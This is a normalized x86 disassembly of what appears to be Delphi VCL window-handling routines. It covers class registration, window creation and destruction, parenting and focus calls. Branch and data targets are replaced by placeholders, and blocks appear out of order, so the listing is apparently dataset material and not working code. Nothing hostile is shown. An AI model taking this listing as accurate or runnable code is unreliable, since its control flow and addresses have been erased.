pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43a1ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_43a870
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_43a834
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_43a834
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43a240
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43a1ec
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_43a07c
pop ecx
push ebp
mov al 0x2
call sub_43a07c
pop ecx
push ebp
mov al 0x3
call sub_43a07c
pop ecx
push ebp
mov al 0x4
call sub_43a07c
pop ecx
push ebp
mov al 0x5
call sub_43a07c
pop ecx
push ebp
mov al 0x6
call sub_43a07c
pop ecx
push ebp
xor eax eax
call sub_43a07c
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403430
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_43a344
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43de44
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a3d8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43a3e0
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_43a408
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_436d5c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a870
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a4d4
mov eax [ ebp - 0xc ]
call sub_403234
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43a834
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4136e4
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_436ac8
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413840
xor ecx ecx
mov edx 0xb03e
call sub_43850c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43a834
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_43a4dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a870
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_43a3d8
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_43a870
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a834
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4136e4
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_413840
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
mov eax [ ebp - 0x4 ]
call sub_43a3e0
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a834
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43686c
mov dl 0x4
call sub_43686c
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413730
sub_43a630
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44e0b4
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_451dd8
sub_43a650
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_435c4c
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_435c4c
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_435c4c
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_43a69c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_435c74
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_435c74
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_435c74
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_43a6e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403430
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43850c
mov edx ebx
mov eax edi
call sub_43a650
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43850c
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43850c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
call sub_43de44
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43850c
mov eax edi
call sub_43b234
jmp r-xdata
mov edx ebx
mov eax edi
call sub_43a344
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a7b8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43850c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax esi
call sub_43de44
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_43a630
mov eax ebp
call sub_43b098
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43a69c
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43850c
mov eax esi
call sub_43a400
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4377a0
sub_43a834
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_413840
mov edx edi
mov eax ebp
call sub_413840
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43a890
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_43a870
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_43a834
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_43a8d0
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_43a890
add esp 0x10
retn
sub_43a8f8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_43a964
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43799c
test al al
je r-xdata
mov eax ebx
call sub_4379cc
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403430
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403430
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_43a9cc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c40
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43a964
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_43db40
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4083dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aaf1
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_43aaf8
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43414c
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43414c
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c69c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c69c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408590
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_43de50
push 0x1
mov eax [ esi + 0x68 ]
call sub_41c24c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43850c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_43db40
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43acc0
lea eax [ ebp - 0xc0 ]
call sub_403f6c
retn
mov eax esi
mov si 0xffee
call sub_403430
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_43acc8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406894
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_43ad08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417670
mov eax esi
call sub_4175c0
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_4175c0
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417678
pop esi
pop ebx
retn
sub_43ad40
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_418ebc
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_418e48
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_418e48
mov eax esi
call sub_418ec4
add esp 0x10
pop esi
pop ebx
retn
sub_43ada8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_43ad94
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413840
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413840
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_43ae80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_438844
mov eax [ ebp - 0x8 ]
push eax
push sub_43ad08
mov eax [ ebp - 0x8 ]
push eax
push sub_43ad40
push ebp
call sub_43ada8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43aedc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4372cc
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408544
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408558
mov ecx eax
mov edx edi
mov eax ebx
call sub_4372dc
mov eax r-xdata
call sub_408564
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_435d80
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_43af34
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43af88
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c69c
sub_43af98
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41389c
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_413840
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_43afe0
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_43af98
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43a834
call sub_4369ac
inc edi
dec esi
jne r-xdata
sub_43b07c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_43b098
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_413840
call sub_43b098
inc edi
dec esi
jne r-xdata
sub_43b0f8
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403430
mov ebx eax
mov eax edi
call sub_43b098
mov eax edi
call sub_43b234
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_43b138
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push j_sub_4036bc#9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43850c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413840
call sub_43b138
inc esi
dec ebx
jne r-xdata
sub_43b234
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43b138
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_43b274
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_43b098
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_43b234
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_40687c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43850c
jmp r-xdata
sub_43b2fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036bc#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b34a
call sub_435d80
call sub_41eaf0
retn
sub_43b374
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_4123e4
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
